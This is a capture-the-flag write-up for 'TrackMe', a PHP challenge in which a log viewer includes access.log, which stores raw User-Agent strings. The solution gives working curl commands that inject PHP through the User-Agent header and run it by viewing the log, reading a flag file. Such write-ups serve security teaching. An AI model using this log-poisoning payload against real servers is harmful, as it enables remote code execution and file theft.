# TrackMe

**Category:** Web Exploitation 
**Flag:** `SkillBit{Fake_Flag_For_Testing}` (placeholder — real flag injected at deploy time)

## Challenge

A PHP analytics dashboard logs every visitor's details (IP, User-Agent, Referer, URI) to `access.log`. A log viewer at `/logs.php` lets the site owner review recorded visits. The flavor text says no one has reviewed the code since it was installed.

## Vulnerability

The log viewer in `logs.php` uses `include` (line 59) to render log files instead of a safe read function like `file_get_contents`:

```php
ob_start;
include $path;
$rendered = ob_get_clean;
```

Although the output is later escaped with `htmlspecialchars`, the `include` already executed any PHP code embedded in the file. Meanwhile, `index.php` writes the raw User-Agent header directly into the log with no sanitization:

```php
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '-';
// ...
$log .= "User-Agent: $ua\n";
file_put_contents(__DIR__ . "/logs/access.log", $log, FILE_APPEND);
```

This is a classic **log poisoning** attack: inject PHP into the User-Agent, then trigger execution by viewing the log through the `include`-based viewer.

## Solution

The flag is written to `/flag-<random hex>.txt` at container startup, so we need a glob to find it.

### Step 1 — Poison the log

```bash
curl -A '<?php $f=glob("/flag-*")[0]; echo file_get_contents($f); ?>' http://target:8080/
```

This logs a visit whose User-Agent field contains a PHP snippet.

### Step 2 — Trigger execution

```bash
curl http://target:8080/logs.php?file=access.log
```

When `logs.php` includes `access.log`, PHP executes our injected code. The flag file contents appear in the rendered output.

## Flag

```
SkillBit{...} (injected at runtime)
```
